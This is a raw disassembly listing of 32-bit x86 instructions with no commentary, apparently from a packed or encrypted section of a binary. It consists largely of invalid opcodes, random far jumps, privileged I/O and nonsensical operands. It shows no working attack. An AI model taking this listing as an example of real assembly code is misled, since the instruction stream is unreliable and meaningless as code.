  41622f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416230:	loopne 0x416220
  416232:	imul   edx,DWORD PTR [esp+edi*1-0x364e315c],0xffffffcb
  41623a:	xchg   edi,eax
  41623b:	mov    al,0xc6
  41623d:	pop    edi
  41623e:	aas    
  41623f:	dec    ebp
  416240:	mov    al,0x62
  416242:	jns    0x41622f
  416244:	loope  0x4162b2
  416246:	lods   eax,DWORD PTR ds:[esi]
  416247:	adc    eax,0xc46eb14c
  41624c:	jne    0x4161e0
  41624e:	(bad)  
  41624f:	lds    ebx,FWORD PTR [ebp-0x5f]
  416252:	jge    0x416230
  416254:	stos   DWORD PTR es:[edi],eax
  416255:	jp     0x416205
  416257:	cld    
  416258:	push   ds
  416259:	dec    esi
  41625a:	pop    ds
  41625b:	mov    bl,0x25
  41625d:	add    al,0x7c
  41625f:	jnp    0x416283
  416261:	int    0x93
  416263:	or     al,0xe3
  416265:	dec    ecx
  416266:	sbb    ah,al
  416268:	xor    eax,0x6916815c
  41626d:	ret    
  41626e:	push   ds
  41626f:	push   ss
  416270:	test   al,0x1b
  416272:	int    0xf9
  416274:	jmp    0xce3ba775
  416279:	test   al,0x19
  41627b:	cmp    BYTE PTR ds:0x6a17520a,dl
  416281:	push   0xffffffda
  416283:	jo     0x4162b5
  416285:	lods   al,BYTE PTR ds:[esi]
  416286:	ins    DWORD PTR es:[edi],dx
  416287:	and    DWORD PTR [eax+0x7],ebp
  41628a:	cli    
  41628b:	xchg   DWORD PTR ds:0x7e4e3cb1,edi
  416291:	push   ebp
  416292:	or     BYTE PTR [ebp-0x63],dh
  416295:	jne    0x4162e8
  416297:	repnz cmp eax,DWORD PTR [ebp-0x44]
  41629b:	shl    bh,1
  41629d:	out    0x7c,eax
  41629f:	out    dx,eax
  4162a0:	js     0x4162a3
  4162a2:	lea    edi,[edi]
  4162a4:	dec    edi
  4162a5:	cmc    
  4162a6:	mov    BYTE PTR [ebx+0x6425147],ah
  4162ac:	and    eax,DWORD PTR [ebp+0x78]
  4162af:	(bad)  
  4162b0:	cmp    eax,0xa3d7c815
  4162b5:	add    eax,0xcd1b54d8
  4162ba:	mov    BYTE PTR [esi],cl
  4162bc:	hlt    
  4162bd:	pop    es
  4162be:	and    dl,dl
  4162c0:	sub    dl,BYTE PTR [esi]
  4162c2:	jo     0x416311
  4162c4:	pop    ebp
  4162c5:	inc    ebp
  4162c6:	out    dx,eax
  4162c7:	xor    BYTE PTR ds:0x21d9a97,ah
  4162cd:	cmp    DWORD PTR [ecx+eax*8+0xd5092b3],ecx
  4162d4:	fcomip st,st(5)
  4162d6:	mov    ebp,0xa255bbf
  4162db:	jne    0x4162a4
  4162dd:	shr    ebx,0x1a
  4162e0:	js     0x41629d
  4162e2:	adc    DWORD PTR [esi],eax
  4162e4:	iret   
  4162e5:	imul   ebp,DWORD PTR [edx+ebx*8+0x50],0xffffffcc
  4162ea:	adc    DWORD PTR [edx+0x75b4391d],esi
  4162f0:	pop    ebx
  4162f1:	dec    esp
  4162f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162f3:	mov    dh,0x8
  4162f5:	fcom   DWORD PTR [edi+edi*1]
  4162f8:	hlt    
  4162f9:	mov    eax,0xb60b7b4d
  4162fe:	adc    dl,bl
  416300:	leave  
  416301:	scas   eax,DWORD PTR es:[edi]
  416302:	jmp    0x4162f1
  416304:	sub    DWORD PTR [ebx],eax
  416306:	loop   0x4162bc
  416308:	bound  ebx,QWORD PTR [edx-0x5b]
  41630b:	dec    BYTE PTR [ebp-0x51]
  41630e:	pop    eax
  41630f:	pusha  
  416310:	rcr    BYTE PTR [ebx-0x4e],0x93
  416314:	and    DWORD PTR [edi+esi*4+0x27],ecx
  416318:	lock xor DWORD PTR [ebx-0xc],eax
  41631c:	pop    esp
  41631d:	lods   eax,DWORD PTR ds:[esi]
  41631e:	aad    0xf0
  416320:	(bad)  
  416321:	and    al,0xce
  416323:	aam    0x47
  416325:	mov    ch,0x9a
  416327:	jmp    0x4e94:0xab2b72f5
  41632e:	(bad)  
  41632f:	push   esp
  416330:	in     al,dx
  416331:	push   ds
  416332:	mov    BYTE PTR [edx],ah
  416334:	int3   
  416335:	xor    al,0x37
  416337:	neg    esi
  416339:	imul   esi,DWORD PTR [eax+0x95cd523],0x51d2269a
  416343:	leave  
  416344:	cmp    al,0xfc
  416346:	pop    esi
  416347:	nop
  416348:	popf   
  416349:	sub    cl,BYTE PTR [edx+edi*8+0x8d6c66]
  416350:	mov    al,ds:0x1f67f5b8
  416355:	xor    DWORD PTR [ebx-0x3a],edi
  416358:	mov    BYTE PTR [ecx+0x29cf3be7],dl
  41635e:	fcomp  DWORD PTR [ecx+0x73]
  416361:	es or  DWORD PTR ds:[esi+0x4],esp
  416366:	aam    0x1b
  416368:	jl     0x416337
  41636a:	pop    esp
  41636b:	push   edi
  41636c:	add    BYTE PTR [ebp+0x7b],0x51
  416370:	jno    0x4162fe
  416372:	stc    
  416373:	inc    esp
  416374:	mov    edx,DWORD PTR [ebx+0x74]
  416377:	push   cs
  416378:	js     0x4162fa
  41637a:	sub    bh,ah
  41637c:	xor    eax,0x847300ed
  416381:	inc    ebx
  416382:	sub    ebx,DWORD PTR [edi+0x168bbbe3]
  416388:	mov    WORD PTR [edx*8+0x4d78e976],cs
  41638f:	js     0x416349
  416391:	in     eax,0x1d
  416393:	xor    al,0xbf
  416395:	rcr    BYTE PTR [edi],cl
  416397:	in     al,0xb1
  416399:	stc    
  41639a:	std    
  41639b:	and    DWORD PTR [ecx+0x44],edx
  41639e:	or     dl,BYTE PTR [edx+0x40]
  4163a1:	enter  0x14b7,0x8a
  4163a5:	sub    eax,0xdbe8aad7
  4163aa:	mov    ds:0xe5492281,eax
  4163af:	cmp    DWORD PTR [edi],eax
  4163b1:	icebp  
  4163b2:	sub    DWORD PTR [ebx+0x19f40994],edi
  4163b8:	shr    BYTE PTR [ebp-0x22],1
  4163bb:	jnp    0x416378
  4163bd:	sub    ah,BYTE PTR [ebp-0x39]
  4163c0:	ret    
  4163c1:	xchg   DWORD PTR [ecx-0x1565f779],ecx
  4163c7:	sub    DWORD PTR [eax],0xffffff9e
  4163ca:	outs   dx,BYTE PTR ds:[esi]
  4163cb:	ret    
  4163cc:	xchg   edx,eax
  4163cd:	sbb    DWORD PTR [ecx+0x6a],ecx
  4163d0:	inc    edx
  4163d1:	xor    al,0x42
  4163d3:	adc    ebx,DWORD PTR [eax+0x2]
  4163d6:	(bad)  
  4163d7:	std    
  4163d8:	xor    edi,DWORD PTR [ebp+eax*2+0x79]
  4163dc:	call   0x6ebe:0xd7eb4d2d
  4163e3:	fsubr  st(4),st
  4163e5:	cmp    DWORD PTR [ebx+0x45],eax
  4163e8:	sub    al,0x6a
  4163ea:	addr16 in eax,0x5f
  4163ed:	push   esi
  4163ee:	mov    ah,0x3b
  4163f0:	es and esi,eax
  4163f3:	mov    ebx,DWORD PTR [edx]
  4163f5:	jbe    0x4163e7
  4163f7:	stos   BYTE PTR es:[edi],al
  4163f8:	jb     0x4163a9
  4163fa:	dec    edi
  4163fb:	jo     0x41643c
  4163fd:	ds js  0x4163ba
  416400:	push   eax
  416401:	sar    DWORD PTR [esp+ecx*4-0x5379af00],cl
  416408:	jo     0x4163cc
  41640a:	mov    esi,0xd002e87c
  41640f:	pusha  
  416410:	cli    
  416411:	loop   0x41639f
  416413:	cmp    BYTE PTR [esi-0x56],al
  416416:	inc    esi
  416417:	xor    ebx,esp
  416419:	retf   0xf61c
  41641c:	cmp    al,cl
  41641e:	sub    eax,0xfc394560
  416423:	or     eax,0x1dc06013
  416428:	(bad)  
  416429:	call   0x2d60:0xe5cefe51
  416430:	test   BYTE PTR [edx*2+0x3198596],bh
  416437:	int3   
  416438:	shl    BYTE PTR [eax+0x4d],1
  41643b:	dec    edx
  41643c:	jne    0x4163ee
  41643e:	sub    al,0x3
  416440:	jb     0x4164af
  416442:	cmp    al,0x7f
  416444:	add    cl,bl
  416446:	sbb    ch,BYTE PTR [esi-0x8ade9c4]
  41644c:	dec    ebx
  41644d:	in     al,0xf9
  41644f:	mov    ah,0xf2
  416451:	inc    edi
  416452:	js     0x4163ec
  416454:	mov    ebx,0x57ab24e3
  416459:	cmp    eax,0xde76d9e0
  41645e:	mov    esi,0xe040d651
  416463:	ja     0x41644a
  416465:	jo     0x416427
  416467:	repnz mov edx,0x9e223910
  41646d:	lock retf 
  41646f:	jo     0x416484
  416471:	imul   esi,DWORD PTR [ebp+0x187fdfa4],0xdcf1a729
  41647b:	lods   al,BYTE PTR ds:[esi]
  41647c:	(bad)  
  41647d:	cmp    DWORD PTR [edi-0x6eff9c3d],edi
  416483:	loop   0x416472
  416485:	adc    dh,BYTE PTR [edx]
  416487:	and    dl,al
  416489:	retf   0x6037
  41648c:	mov    al,0x73
  41648e:	push   0x6c
  416490:	cmp    edi,DWORD PTR [esi+eiz*1+0x5]
  416494:	dec    ecx
  416495:	fnop   
  416497:	pop    edi
  416498:	push   edi
  416499:	ins    BYTE PTR es:[edi],dx
  41649a:	or     BYTE PTR ds:0x43e029e7,dl
  4164a0:	pop    eax
  4164a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164a2:	or     BYTE PTR [esi+0x6b05384e],cl
  4164a8:	sbb    edx,DWORD PTR [edi]
  4164aa:	cwde   
  4164ab:	adc    dh,al
  4164ad:	fimul  DWORD PTR [esi-0x10]
  4164b0:	xchg   esi,eax
  4164b1:	call   0xbaf59c1d
  4164b6:	or     eax,0x2566265a
  4164bb:	xchg   esi,eax
  4164bc:	fisttp DWORD PTR [ebp+0x7b]
  4164bf:	jp     0x416498
  4164c1:	push   ebx
  4164c2:	mov    fs,esp
  4164c4:	xor    eax,0x6745c0e1
  4164c9:	std    
  4164ca:	pusha  
  4164cb:	xchg   esi,eax
  4164cc:	push   ds
  4164cd:	push   ecx
  4164ce:	rcr    dl,0xd6
  4164d1:	mov    BYTE PTR [eax+0x14],al
  4164d4:	inc    esi
  4164d5:	sbb    BYTE PTR [edx],0x40
  4164d8:	pop    edi
  4164d9:	mov    al,0x5
  4164db:	push   ebx
  4164dc:	test   DWORD PTR [eax-0x4f907693],0xc56f4ce3
  4164e6:	sbb    eax,0xcda9a5d9
  4164eb:	not    DWORD PTR [ebx-0x59]
  4164ee:	push   es
  4164ef:	pop    esp
  4164f0:	out    dx,al
  4164f1:	adc    bl,cl
  4164f3:	cmc    
  4164f4:	cmp    BYTE PTR [edi+0x688153e3],bl
  4164fa:	lods   al,BYTE PTR ds:[esi]
  4164fb:	or     eax,0x3006f0b1
  416500:	(bad)  
  416502:	outs   dx,DWORD PTR ds:[esi]
  416503:	add    DWORD PTR [ebp-0x3],edi
  416506:	ja     0x416556
  416508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416509:	mov    eax,ds:0x654d2f27
  41650e:	pusha  
  41650f:	pushf  
  416510:	mov    DWORD PTR [edi],ebp
  416512:	pop    es
  416513:	sbb    esp,esp
  416515:	jns    0x4164b6
  416517:	jmp    0x4308:0x7ccb88b6
  41651e:	repz push ds
  416520:	push   ss
  416521:	into   
  416522:	fwait
  416523:	push   eax
  416524:	repz mov eax,0x9fef59ed
  41652a:	data16 cli 
  41652c:	shl    DWORD PTR [ecx],0xfe
  41652f:	push   esp
  416530:	push   0x784c6d6e
  416535:	jne    0x416506
  416537:	and    al,bl
  416539:	test   al,0x2
  41653b:	add    cl,BYTE PTR [ebx-0x62d02712]
  416541:	aad    0x19
  416543:	imul   ebx,DWORD PTR [edi],0xfffffffa
  416546:	out    0x42,eax
  416548:	shl    DWORD PTR [ecx+0x62d73367],1
  41654e:	xchg   ebp,eax
  41654f:	inc    edx
  416550:	addr16 jns 0x416500
  416553:	sbb    cl,BYTE PTR [esi+0x52]
  416556:	loopne 0x416539
  416558:	(bad)  
  416559:	mov    esi,0xe8cfcf8e
  41655e:	adc    al,0x25
  416560:	retf   0x2221
  416563:	mov    eax,ds:0x2ae40d85
  416568:	movq   mm4,mm2
  41656b:	dec    ebp
  41656c:	xchg   DWORD PTR [edi+0x6b],ecx
  41656f:	sbb    BYTE PTR [ebx],bl
  416571:	cs out 0x7d,al
  416574:	out    0xbe,al
  416576:	mov    BYTE PTR [ebx+0x25],dl
  416579:	sbb    BYTE PTR [ebx-0x5c],0x26
  41657d:	jg     0x416506
  41657f:	push   es
  416580:	scas   al,BYTE PTR es:[edi]
  416581:	sub    al,0xa8
  416583:	lock mov eax,ds:0xd8833031
  416589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41658a:	mov    ecx,0x43410877
  41658f:	and    eax,0x290852
  416594:	aas    
  416595:	shr    BYTE PTR ss:[edx],0x9
  416599:	mov    ebp,0x4b3f767f
  41659e:	call   0xf09e657e
  4165a3:	leave  
  4165a4:	mov    cl,0xc5
  4165a6:	xchg   edi,eax
  4165a7:	pop    edx
  4165a8:	pushf  
  4165a9:	(bad)  
  4165aa:	sub    al,0x25
  4165ac:	popf   
  4165ad:	inc    ebx
  4165ae:	push   ebx
  4165af:	(bad)  
  4165b0:	(bad)  
  4165b1:	xchg   edx,eax
  4165b2:	pop    ebx
  4165b3:	jmp    0x416605
  4165b5:	xchg   esp,eax
  4165b6:	in     eax,0xa6
  4165b8:	sbb    eax,0x17ec18cb
  4165bd:	fnstcw WORD PTR [eax]
  4165bf:	and    al,0x27
  4165c1:	retf   
  4165c2:	(bad)  [edi+0x2fe6b9f]
  4165c8:	leave  
  4165c9:	sub    al,0x83
  4165cb:	(bad)  
  4165cc:	cli    
  4165cd:	adc    al,0xc
  4165cf:	push   edx
  4165d0:	sub    ebx,DWORD PTR [eax+0x423245d3]
  4165d6:	lea    edx,[edi+eiz*1]
  4165d9:	add    al,0xa5
  4165db:	xchg   ebp,eax
  4165dc:	js     0x4165b6
  4165de:	jmp    0x41658e
  4165e0:	push   0xb9094145
  4165e5:	push   ds
  4165e6:	add    al,0x6c
  4165e8:	pushf  
  4165e9:	ret    
  4165ea:	xchg   edi,eax
  4165eb:	xchg   esi,eax
  4165ec:	adc    edi,DWORD PTR [esi]
  4165ee:	or     DWORD PTR [edi],esp
  4165f0:	mov    dl,0xdb
  4165f2:	test   eax,0x9ac43a39
  4165f7:	or     al,BYTE PTR [eax]
  4165f9:	sti    
  4165fa:	mov    dh,0xe2
  4165fc:	jns    0x41663e
  4165fe:	xchg   esi,eax
  4165ff:	and    ebp,DWORD PTR [edi-0x923b834]
  416605:	pusha  
  416606:	jno    0x4165be
  416608:	hlt    
  416609:	das    
  41660a:	fld    DWORD PTR [eax]
  41660c:	jg     0x416592
  41660e:	push   ecx
  41660f:	out    0xd9,al
  416611:	ja     0x41663e
  416613:	ds jge 0x416600
  416616:	pop    ebp
  416617:	xor    esp,DWORD PTR [eax+0x5c88e6b6]
  41661d:	adc    BYTE PTR [ebp*8-0x2fe57332],0x67
  416625:	pop    esi
  416626:	mov    dh,0x43
  416628:	loope  0x4165df
  41662a:	mov    al,ds:0x2cfba9d9
  41662f:	push   ss
  416630:	add    bh,ah
  416632:	jnp    0x416690
  416634:	sub    DWORD PTR [ecx-0x331a8035],edx
  41663a:	adc    DWORD PTR [esp+ecx*4],edx
  41663d:	addr16 das 
  41663f:	push   es
  416640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416641:	dec    edx
  416642:	(bad)  
  416643:	out    dx,al
  416644:	jmp    FWORD PTR ds:0xfb72fc55
  41664a:	cs add al,0x50
  41664d:	mov    ebx,0x6162e400
  416652:	xchg   edx,eax
  416653:	int3   
  416654:	in     al,0x1
  416656:	and    esi,DWORD PTR [edx]
  416658:	sbb    dh,BYTE PTR [ebp-0x64b821f4]
  41665e:	pop    edi
  41665f:	les    ebx,FWORD PTR [edi]
  416661:	push   ebp
  416662:	sbb    esp,DWORD PTR [eax+0x28]
  416665:	sub    al,0x3
  416667:	jmp    0xcd4c83ea
  41666c:	jge    0x416610
  41666e:	das    
  41666f:	icebp  
  416670:	mov    al,0x4c
  416672:	dec    ebx
  416673:	ret    
  416674:	push   0x5d3fd91c
  416679:	mov    dl,0xf0
  41667b:	aas    
  41667c:	mov    bh,0x89
  41667e:	sub    al,0x7e
  416680:	outs   dx,BYTE PTR ds:[esi]
  416681:	fiadd  DWORD PTR [ebp-0x4a]
  416684:	repnz es add edi,edx
  416688:	call   0xec0:0xa99f300d
  41668f:	mov    esp,0xb305d05c
  416694:	mov    ds:0x4af2af83,eax
  416699:	lods   al,BYTE PTR ds:[esi]
  41669a:	pop    edi
  41669b:	xchg   esi,eax
  41669c:	stc    
  41669d:	mov    ah,0x2
  41669f:	xchg   ebx,eax
  4166a0:	inc    ecx
  4166a1:	dec    edi
  4166a2:	inc    ebp
  4166a3:	out    0xbd,eax
  4166a5:	int3   
  4166a6:	sar    DWORD PTR [eax-0x1a6e0035],cl
  4166ac:	jbe    0x416661
  4166ae:	jmp    0x416685
  4166b0:	icebp  
  4166b1:	sub    DWORD PTR [edi+0x6b],edi
  4166b4:	and    eax,0x2fab5c75
  4166b9:	mov    ds:0x915a9572,al
  4166be:	shl    BYTE PTR [edi+0x87e0f2a],0xb
  4166c5:	test   esp,ebp
  4166c7:	push   ecx
  4166c8:	mov    esp,0x1a47adc1
  4166cd:	jmp    0x7931:0xec3ae6d8
  4166d4:	mov    ?,edx
  4166d6:	rol    BYTE PTR [esi+0x49ddfeb1],cl
  4166dc:	mov    edi,0x4f4145e1
  4166e1:	jl     0x4166a6
  4166e3:	cld    
  4166e4:	call   0x3ec6:0x36a5e1ab
  4166eb:	fistp  DWORD PTR [edx+eiz*2-0x78]
  4166ef:	pop    eax
  4166f0:	imul   esi,DWORD PTR fs:[edx],0xffffffe0
  4166f4:	mov    ebp,DWORD PTR [edx+eiz*4+0x6b]
  4166f8:	xor    eax,DWORD PTR [eax]
  4166fa:	shl    DWORD PTR [esi+0x46ff35fe],1
  416700:	xchg   edx,eax
  416701:	out    dx,eax
  416702:	icebp  
  416703:	adc    DWORD PTR [ebx-0x5e],ebx
  416706:	push   0xffffff99
  416708:	scas   al,BYTE PTR es:[edi]
  416709:	retf   
  41670a:	mov    DWORD PTR [ebp-0x7d],eax
  41670d:	retf   0xa288
  416710:	aad    0x50
  416712:	or     al,0xae
  416714:	dec    edx
  416715:	add    eax,0x54dfeacd
  41671a:	aaa    
  41671b:	inc    edi
  41671c:	mov    esp,0xe1d0ddc5
  416721:	arpl   WORD PTR [eax],di
  416723:	mov    ds:0xf4b7efbc,al
  416728:	lods   al,BYTE PTR ds:[esi]
  416729:	imul   esp,edi,0x450f5a66
  41672f:	push   es
  416730:	std    
  416731:	and    eax,0xe37fdefa
  416736:	arpl   WORD PTR [edi+0x5c1f2705],dx
  41673c:	cdq    
  41673d:	aaa    
  41673e:	fnsave [ecx-0x4182c4fb]
  416744:	out    0x1,al
  416746:	scas   al,BYTE PTR es:[edi]
  416747:	adc    BYTE PTR [ecx-0x290960bc],0x73
  41674e:	push   edi
  41674f:	imul   ebx,DWORD PTR [esi-0x1b3c7e48],0xc
  416756:	jmp    0x77514073
  41675b:	inc    esp
  41675c:	sub    DWORD PTR [edx],esp
  41675e:	out    0x7f,al
  416760:	xchg   esp,eax
  416761:	or     ch,BYTE PTR [ecx-0xb75d846]
  416767:	gs stc 
  416769:	in     eax,dx
  41676a:	pop    ss
  41676b:	push   ss
  41676c:	xor    BYTE PTR [edx-0x34405500],dl
  416772:	xchg   ecx,edi
  416774:	popa   
  416775:	mov    bh,0x78
  416777:	pop    ebp
  416778:	popf   
  416779:	aaa    
  41677a:	inc    eax
  41677b:	cmp    ecx,DWORD PTR ds:0x2524768e
  416781:	leave  
  416782:	ins    DWORD PTR es:[edi],dx
  416783:	mov    cl,0x4
  416785:	ins    DWORD PTR es:[edi],dx
  416786:	jle    0x4167e7
  416788:	xchg   DWORD PTR [esi-0x2b1d77d7],eax
  41678e:	pushf  
  41678f:	jb     0x416749
  416791:	add    al,0xcf
  416793:	shl    BYTE PTR [edx-0x6f],0x3c
  416797:	ficomp DWORD PTR [esi+0x3f54bc84]
  41679d:	mov    bl,0xf4
  41679f:	adc    DWORD PTR [eax+0x69],esp
  4167a2:	in     al,dx
  4167a3:	jmp    0x7013:0x4285437e
  4167aa:	loope  0x416759
  4167ac:	jp     0x41674a
  4167ae:	sub    ebx,edi
  4167b0:	cmp    ch,BYTE PTR [ebp-0x1c]
  4167b3:	sub    DWORD PTR [ecx],edi
  4167b5:	cmp    eax,0x1ae0aad5
  4167ba:	dec    esi
  4167bb:	(bad)  
  4167bc:	sti    
  4167bd:	xchg   BYTE PTR [esi-0x4288fb9d],al
  4167c3:	sub    DWORD PTR [ebp+0x5f],0xffffffc9
  4167c7:	leave  
  4167c8:	in     al,dx
  4167c9:	adc    eax,0x37b8a499
  4167ce:	mov    ebx,0xf9a3802
  4167d3:	mov    ch,0x8e
  4167d5:	in     al,dx
  4167d6:	loope  0x4167a8
  4167d8:	dec    ebp
  4167d9:	scas   al,BYTE PTR es:[edi]
  4167da:	fnsave [ebx+0x3724e96d]
  4167e0:	and    al,0x4
  4167e2:	sar    esp,1
  4167e4:	inc    eax
  4167e5:	popf   
  4167e6:	and    al,0xcd
  4167e9:	push   esi
  4167ea:	inc    esp
  4167eb:	adc    ch,bh
  4167ed:	(bad)  [eax]
  4167ef:	xor    eax,0x4072fabf
  4167f4:	sar    bh,cl
  4167f6:	mov    bh,0x22
  4167f8:	add    eax,0x81454abc
  4167fd:	clc    
  4167fe:	adc    dl,BYTE PTR [esi-0x13]
  416801:	jmp    0x41681b
  416803:	sub    esp,esi
  416805:	fisubr DWORD PTR [eax+0x4d43aeed]
  41680b:	mov    esi,0xbf0f28f6
  416810:	mov    edi,0xd7aab2d7
  416815:	or     edi,DWORD PTR [ebp+0x34]
  416818:	lods   al,BYTE PTR ds:[esi]
  416819:	xchg   edx,eax
  41681a:	mov    al,ds:0x4f020bd9
  41681f:	or     BYTE PTR [eax-0x30],al
  416822:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416823:	ret    0xa1bf
  416826:	push   ss
  416827:	leave  
  416828:	push   eax
  416829:	sbb    al,0xd9
  41682b:	arpl   si,di
  41682d:	retf   
  41682e:	out    dx,al
  41682f:	mov    al,0x19
  416831:	pushf  
  416832:	sar    BYTE PTR [edx+0x3431c3a2],0xef
  416839:	dec    ecx
  41683a:	aad    0x79
  41683c:	jmp    FWORD PTR [ecx+0x5e]
  41683f:	sti    
  416840:	int    0x97
  416842:	fild   DWORD PTR [edi]
  416844:	imul   ecx,DWORD PTR [edi-0x3b5bdb5d],0xc1f1f5b1
  41684e:	add    eax,0xa3345cb7
  416853:	mov    DWORD PTR [ecx-0x1840cf54],esp
  416859:	nop
  41685a:	aaa    
  41685b:	or     eax,0x97bd6965
  416860:	mov    eax,ds:0xaa3ef789
  416865:	mov    edi,0xaf8478aa
  41686a:	mov    ds:0x9512cdb8,eax
  41686f:	test   ecx,edi
  416871:	pop    esi
  416872:	pop    ds
  416873:	xchg   DWORD PTR [edi],eax
  416875:	mov    esp,0xd71cd9f5
  41687a:	push   cs
  41687b:	xchg   DWORD PTR [ebx+0xd],edx
  41687e:	xor    eax,0xb5026df6
  416883:	push   0x910277b0
  416888:	bound  eax,QWORD PTR [ecx+0x7028c8d3]
  41688e:	pop    ecx
  41688f:	je     0x4168d9
  416891:	outs   dx,BYTE PTR es:[esi]
  416893:	(bad)  
  416894:	cmp    BYTE PTR [ebx+edi*8],bh
  416897:	in     eax,0xe1
  416899:	mov    edi,0xba956aee
  41689e:	repz xor DWORD PTR [edi-0x5c],esp
  4168a2:	push   cs
  4168a3:	bnd js 0x416878
  4168a6:	pop    ebp
  4168a7:	(bad)  
  4168a8:	pop    ebp
  4168a9:	push   ecx
  4168aa:	ins    BYTE PTR es:[edi],dx
  4168ab:	loopne 0x4168f3
  4168ad:	mov    ?,WORD PTR [ebx-0x7ff2fb1c]
  4168b3:	out    dx,al
  4168b4:	nop
  4168b5:	and    esp,esp
  4168b7:	or     ah,BYTE PTR [ebx-0x75027595]
  4168bd:	sub    DWORD PTR [ecx+edi*2],esp
  4168c0:	mov    cl,0x46
  4168c2:	pop    ebp
  4168c3:	xchg   ecx,eax
  4168c4:	mov    ebp,0x1cc6cb6f
  4168c9:	jmp    0xd3d9:0x2856d259
  4168d0:	push   eax
  4168d1:	xor    al,0x36
  4168d3:	dec    ebx
  4168d4:	xor    DWORD PTR [ebx],esi
  4168d6:	jnp    0x416866
  4168d8:	mov    al,dl
  4168da:	jmp    0xf355:0xf7619cd9
  4168e1:	xor    edx,DWORD PTR [edi-0x1e1565c7]
  4168e7:	(bad)  
  4168e8:	cmp    ebx,DWORD PTR [ecx+0x39]
  4168eb:	loop   0x4168c9
  4168ed:	ficom  WORD PTR [ebp-0x1d09f282]
  4168f3:	aas    
  4168f4:	sbb    eax,0x2348cd00
  4168f9:	popa   
  4168fa:	in     al,0x58
  4168fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168fe:	jecxz  0x41690b
  416900:	jb     0x416976
  416902:	stos   DWORD PTR es:[edi],eax
  416903:	scas   al,BYTE PTR es:[edi]
  416904:	dec    edi
  416905:	add    BYTE PTR [eax-0x4e100623],cl
  41690b:	std    
  41690c:	mov    dl,0xfb
  41690e:	and    DWORD PTR [ebp+0x1b722623],eax
  416914:	jle    0x41692a
  416916:	xor    al,BYTE PTR [esi+ecx*2+0x34e8d6d4]
  41691d:	push   edi
  41691e:	retf   0x71dd
  416921:	dec    ebx
  416922:	repnz (bad) 
  416924:	rcr    BYTE PTR [ebx+0x5c],cl
  416927:	stos   DWORD PTR es:[edi],eax
  416928:	inc    eax
  416929:	shl    DWORD PTR [edx-0x19b1284c],0xd2
  416930:	sbb    ecx,esp
  416932:	(bad)  
  416933:	enter  0xa7f,0x25
  416937:	stc    
  416938:	test   eax,0x1298eb6b
  41693d:	test   DWORD PTR [ecx+0x62a417a3],esi
  416943:	cwde   
  416944:	test   eax,0xdc506ba4
  416949:	sbb    bl,dh
  41694b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41694c:	push   0xaa5fc200
  416951:	shr    bl,1
  416953:	and    BYTE PTR [eax+0x3e],0x50
  416957:	sub    eax,0x98629172
  41695c:	iret   
  41695d:	xor    BYTE PTR [esi-0x21],ch
  416960:	loopne 0x41696c
  416962:	or     eax,0xabc88da8
  416967:	sbb    DWORD PTR [edx],ebp
  416969:	int3   
  41696a:	mov    esp,0x3f1c427
  41696f:	retf   0x9a89
  416972:	aas    
  416973:	pop    esp
  416974:	cld    
  416975:	hlt    
  416976:	dec    esp
  416977:	mov    edx,0xe5812a3
  41697c:	fidiv  DWORD PTR [eax]
  41697e:	mov    edi,DWORD PTR [eax-0x1]
  416981:	inc    ebp
  416982:	scas   al,BYTE PTR es:[edi]
  416983:	mov    al,ds:0xcd6e075e
  416988:	xchg   DWORD PTR [esi+0x21e0ff3b],ebx
  41698e:	mov    edx,0x4b2d7029
  416993:	icebp  
  416994:	inc    edx
  416995:	sbb    al,BYTE PTR [ebx-0x7bb915eb]
  41699b:	fucomp st(6)
  41699d:	rcr    DWORD PTR [ecx-0x7ef53fe],cl
  4169a3:	sub    eax,edx
  4169a5:	fnsave [ebx]
  4169a7:	dec    ebx
  4169a8:	inc    esi
  4169a9:	xor    al,bl
  4169ab:	fsub   DWORD PTR [edi+edi*8]
  4169ae:	pop    esp
  4169af:	cmp    ebp,ebp
  4169b1:	cli    
  4169b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169b3:	xor    ah,ah
  4169b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169b6:	repz adc bh,BYTE PTR [edx]
  4169b9:	sub    al,0x2a
  4169bb:	std    
  4169bc:	shr    BYTE PTR [eax+0x4b23d755],0x71
  4169c3:	xchg   edx,eax
  4169c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169c5:	std    
  4169c6:	lods   eax,DWORD PTR ds:[esi]
  4169c7:	sti    
  4169c8:	out    0xd5,eax
  4169ca:	aas    
  4169cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169cc:	or     BYTE PTR [esi],bl
  4169ce:	and    al,BYTE PTR [ecx]
  4169d0:	xor    eax,0x7646c813
  4169d5:	ret    
  4169d6:	inc    ebx
  4169d7:	jge    0x416a44
  4169d9:	aad    0xb4
  4169db:	jg     0x4169e8
  4169dd:	push   ecx
  4169de:	xchg   ebp,eax
  4169df:	jno    0x4169e1
  4169e1:	adc    eax,0x9ad120ad
  4169e6:	cmp    ebx,edx
  4169e8:	dec    edi
  4169e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169ea:	pop    ecx
  4169eb:	fstp   TBYTE PTR [ebx]
  4169ed:	or     al,0x1e
  4169ef:	xchg   DWORD PTR [ebp+0x2e6579f5],edx
  4169f5:	je     0x416a35
  4169f7:	arpl   WORD PTR [esi],si
  4169f9:	mov    ecx,0x562b2861
  4169fe:	mov    fs,WORD PTR [edx-0x52a4ad05]
  416a04:	ret    0x501c
  416a07:	jns    0x416a04
  416a09:	lea    edx,[edx+0x77]
  416a0c:	scas   al,BYTE PTR es:[edi]
  416a0d:	push   0x1e6b3a8e
  416a12:	inc    eax
  416a13:	call   0xecb5:0x7d9d9cdf
  416a1a:	adc    al,0xcf
  416a1d:	sub    al,0x6d
  416a1f:	mov    edi,0x92edca84
  416a24:	adc    cl,BYTE PTR [esi]
  416a26:	in     al,0x4d
  416a28:	std    
  416a29:	call   0xf15baadc
